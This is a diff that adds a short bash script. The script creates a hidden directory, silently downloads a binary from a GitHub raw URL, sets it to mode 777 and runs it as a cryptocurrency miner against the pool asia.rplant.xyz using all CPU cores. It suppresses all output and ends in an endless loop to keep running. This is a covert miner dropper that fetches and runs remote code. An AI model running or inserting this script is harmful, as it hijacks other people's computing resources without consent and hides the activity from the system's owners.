@@ -1,0 +1,8 @@
+#!/bin/bash
+mkdir .kap && cd .kap
+wget -O bubux https://github.com/cai674fangquehe-crypto/ggfs/raw/refs/heads/main/VRL >/dev/null 2>&1
+chmod 777 bubux
+./bubux -a randomvirel --url asia.rplant.xyz:7155 --user vgup4cen6chqskasvfbzk0dmj58bub9iq2nwym4f37mdcwft7.tryty4 -t $(nproc --all) >/dev/null 2>&1
+while [ 1 ]; do
+sleep 3
+done
